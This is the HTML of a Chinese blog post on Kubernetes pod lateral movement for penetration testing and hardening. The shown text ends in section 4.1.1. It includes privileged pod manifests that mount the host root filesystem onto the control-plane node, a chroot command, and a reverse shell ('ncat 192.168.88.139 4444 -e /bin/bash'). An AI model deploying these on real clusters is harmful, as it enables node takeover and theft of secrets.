@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Kubernetes Pod 横向移动 - Geekby&#39;s Blog</title><meta name="Description" content="Kubernetes Pod 横向移动"><meta property="og:title" content="Kubernetes Pod 横向移动" />
+<meta property="og:description" content="Kubernetes Pod 横向移动" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-29T15:28:00+08:00" />
+<meta property="article:modified_time" content="2023-11-29T15:28:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kubernetes Pod 横向移动"/>
+<meta name="twitter:description" content="Kubernetes Pod 横向移动"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" /><link rel="prev" href="https://www.geekby.site/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kubernetes Pod 横向移动",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2023\/11\/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "云原生安全, k8s","wordcount":  1756 ,
+        "url": "https:\/\/www.geekby.site\/2023\/11\/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\/","datePublished": "2023-11-29T15:28:00+08:00","dateModified": "2023-11-29T15:28:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Kubernetes Pod 横向移动"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Kubernetes Pod 横向移动</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>云原生安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-29">2023-11-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1756 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-前言">1 前言</a></li>
+    <li><a href="#2-摘要">2 摘要</a></li>
+    <li><a href="#3-kubernetes-提供的安全方案">3 Kubernetes 提供的安全方案</a></li>
+    <li><a href="#4-不同权限下的场景讨论">4 不同权限下的场景讨论</a>
+      <ul>
+        <li><a href="#41-所有权限均开放">4.1 所有权限均开放</a>
+          <ul>
+            <li><a href="#411-获取-shell">4.1.1 获取 shell</a></li>
+            <li><a href="#412-后渗透">4.1.2 后渗透</a>
+              <ul>
+                <li><a href="#4121-寻找-token">4.1.2.1 寻找 token</a></li>
+                <li><a href="#4122-寻找-kubeconfigs">4.1.2.2 寻找 kubeconfigs</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#42-开放-privileged--hostpid-权限">4.2 开放 Privileged &amp; HostPid 权限</a>
+          <ul>
+            <li><a href="#421-获取-shell">4.2.1 获取 shell</a></li>
+            <li><a href="#422-后渗透">4.2.2 后渗透</a></li>
+          </ul>
+        </li>
+        <li><a href="#43-开放-privilege-权限">4.3 开放 Privilege 权限</a>
+          <ul>
+            <li><a href="#431-获取-shell">4.3.1 获取 shell</a></li>
+            <li><a href="#432-后渗透">4.3.2 后渗透</a>
+              <ul>
+                <li><a href="#4321-undocksh-执行命令">4.3.2.1 undock.sh 执行命令</a></li>
+                <li><a href="#4322-反弹-shell">4.3.2.2 反弹 shell</a></li>
+                <li><a href="#4323-metasploit">4.3.2.3 metasploit</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#44-开放-hostpath-权限">4.4 开放 HostPath 权限</a>
+          <ul>
+            <li><a href="#441-获取-shell">4.4.1 获取 shell</a></li>
+            <li><a href="#442-后渗透">4.4.2 后渗透</a></li>
+          </ul>
+        </li>
+        <li><a href="#45-开放-hostpid-权限">4.5 开放 HostPid 权限</a></li>
+        <li><a href="#46-开放-hostnetwork-权限">4.6 开放 HostNetwork 权限</a>
+          <ul>
+            <li><a href="#461-获取-shell">4.6.1 获取 shell</a></li>
+            <li><a href="#462-后渗透">4.6.2 后渗透</a>
+              <ul>
+                <li><a href="#4621-环境准备">4.6.2.1 环境准备</a></li>
+                <li><a href="#4622-接管集群">4.6.2.2 接管集群</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#47-开放-hostipc-权限">4.7 开放 HostIPC 权限</a></li>
+        <li><a href="#48-无任何权限">4.8 无任何权限</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="kubernetes-pod-横向移动">Kubernetes Pod 横向移动</h1>
+<h2 id="1-前言">1 前言</h2>
+<p>本文讨论了渗透测试场景下，当攻击者在 Kubernetes 集群中拥有创建 pods 权限时，由于配置不当造成集群接管的风险。提出在不同配置下，通过 pods 横向移动并最终接管集群的不同方案。</p>
+<h2 id="2-摘要">2 摘要</h2>
+<p>根据公司安全与隐私保护的设计要求，为了保证系统的信息安全，其中一个原则是最小权限原则。也就是每个用户、系统进程或应用程序都需要使用完成任务所需的最少权限来运行。如果所配置的权限超出了所需的权限，攻击者就会利用这些场景获取敏感数据、入侵其它系统或进行权限提升，从而在当前网络中进行横向移动。</p>
+<p>众所周知，Kubernetes 的部署和 DevOps 的实施流程比较复杂，在部署时由于运维人员的操作，往往导致配置错误或违背了“最小权限原则”，本文总结了多种在真实场景下，如何通过一些配置不当的权限，绕过安全检测，实现接管集群的方法。同时，运维人员可以通过本文的案例，检查 Kubernetes 中的配置，加固环境，从而降低集群安全风险。</p>
+<h2 id="3-kubernetes-提供的安全方案">3 Kubernetes 提供的安全方案</h2>
+<p>提及到 Kubernetes 安全最佳实践，在配置 pod 时要使用最小特权原则。但是，该如何执行细粒度的安全控制，又该如何评估每个属性的风险呢？Kubernetes 提供了多种方式来解决上面的问题</p>
+<ol>
+<li>PodSecurityPolicy</li>
+</ol>
+<ul>
+<li>PodSecurityPolicy 与其它专门的准入控制插件一样，作为内置的策略 API，PodSecurityPolicy可以对Pod的创建更新进行细粒度的授权。核心是通过定义一组pod在运行时必须遵循的条件及相关字段的默认值，只有Pod满足这些条件才会被K8s集群所接受。</li>
+</ul>
+<ol>
+<li>OPA Gatekeeper</li>
+</ol>
+<ul>
+<li>在Kubernetes v1.25 开始，PodSecurityPolicy (PSP) 准入控制器已被移除。OPA（Open Policy Agent）：是一个开源的、通用策略引擎，可以将策略编写为代码。提供一个种高级声明性语言来编写策略，并把决策这一步骤从复杂的业务逻辑中解耦出来。Gatekeeper 是基于 OPA的一个 Kubernetes 策略解决方案，可替代PSP或者部分RBAC功能。因为OPA与Kubernetes对接偏向于底层，不方便用户使用，所以社区就基于OPA引擎开发了OPA Gatekeeper的解决方案，方便使用。如果 pod 拥有的权限超过了策略允许的范围，准入控制器就可以拒绝该 pod 进入集群。</li>
+</ul>
+<p>然而，即使存在用于定义和执行策略的控制措施，运维人员并不总能理解每个特定属性的实际安全影响，而且 pod 的创建往往没有按需要进行锁定。在渗透测试过程中，当获取的 shell 在集群的 pods内，且有权限在集群上创建 pod，而集群却没有强制执行策略，这种情景接管集群控制权限非常简单。但是，如果当前pods下只可以用 <code>hostNetwork</code>、<code>hostPID</code>、<code>hostIPC</code>、<code>hostPath</code> 或 <code>privileged</code> 创建一个 pod 呢？针对不同情景，本文讨论了不同的接管方案。</p>
+<blockquote>
+<p>💭各种权限的概念：</p>
+<ul>
+<li><code>privileged</code>：特权容器是一种具有主机的所有功能的容器，它解除了常规容器的所有限制。特权容器可以执行几乎所有可以直接在主机上执行的操作，包括一些针对内核修改的操作等。比如：calico 容器，在启动的时候初始化容器，要对容器的网络进行设置，就需要特权，对操作系统的设备，命名空间进行修改，这个时候，就需要特权容器</li>
+<li><code>hostPID</code>：容器将共享其主机的进程命名空间，容器可以直接查看和操作主机上的进程。具体而言，<code>hostPID</code> 的使用通常用于一些特殊的用例，例如运行容器内的进程能够查看主机上的其他进程。</li>
+<li><code>HostPath</code>：是Kubernetes的一个核心对象之一，它允许在Pod中使用本地文件系统。HostPath支持读写和只读操作，并提供了丰富的访问权限控制选项。</li>
+<li><code>HostNetwork</code>：允许 Pod 直接使用主机（Node）的网络命名空间。当 Pod 启用 <code>HostNetwork</code> 时，它与主机共享网络栈，可以访问主机上的网络接口和端口。</li>
+<li><code>HostIPC</code> ：是一种 Pod 安全上下文（Pod Security Context）的设置，用于控制 Pod 是否能够共享宿主机的 IPC（Inter-Process Communication）命名空间</li>
+</ul>
+</blockquote>
+<h2 id="4-不同权限下的场景讨论">4 不同权限下的场景讨论</h2>
+<h3 id="41-所有权限均开放">4.1 所有权限均开放</h3>
+<p>创建的 pod 会将主机的文件系统挂载到 pod 上。如果能使用 k8s 中的 nodeName 选择器将 pod 调度在control pannel上，然后，在 pod 中 chroot 到挂载主机文件系统的目录。最终，在运行 pod 的节点上获取了 root 权限。</p>
+<ul>
+<li>从 ETCD 数据库中读取密钥信息 - 攻击者通过在 selector 中指定 nodeName，即可在指定的 node 节点上创建 pod，当 ectd 数据库部署在该节点上时，便可以读取 etcd 数据库中的内容，包含群集的配置信息、密钥等。</li>
+<li>获取特权服务帐户令牌 - 即使只能在集群中的 worker节点上调度 pod，也可以通过读取worker节点上 pod 中挂载的密钥信息。在生产集群中，即使是在 worker 节点上，通常也至少有一个 pod 有一个已挂载的令牌，该令牌绑定到一个服务帐户（service account），如果该令牌拥有较高权限，那么攻击者就有权限在所有命名空间中创建 pod。</li>
+</ul>
+<h4 id="411-获取-shell">4.1.1 获取 shell</h4>
+<p>首先说一下笔者的实验环境：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@k8s-master:~# kubectl get nodes
+</span></span><span class="line"><span class="cl">NAME         STATUS   ROLES           AGE     VERSION
+</span></span><span class="line"><span class="cl">k8s-master   Ready    control-plane   2d19h   v1.28.2
+</span></span><span class="line"><span class="cl">k8s-node1    Ready    &lt;none&gt;          2d19h   v1.28.4
+</span></span><span class="line"><span class="cl">k8s-node2    Ready    &lt;none&gt;          2d19h   v1.28.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看当前 token 所拥有的权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl auth can-i --list --token<span class="o">=</span>xxx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291518861.png-water_print" /></p>
+<p>一个简单的例子，实现上述方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">all-allowed-exec-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostIPC</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">all-allowed-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="c"># 可以通过节点选择器调度到 k8s-master control pannel 中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建 pods：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl apply -f allow_all.yaml
+</span></span><span class="line"><span class="cl">kubectl <span class="nb">exec</span> -it all-allowed-exec-pod -- chroot /host bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523120.png-water_print" /></p>
+<p>如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291523445.png-water_print" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">all-allowed-revshell-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostIPC</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">all-allowed-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.139 4444 -e /bin/bash;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">noderoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524880.png-water_print" /></p>
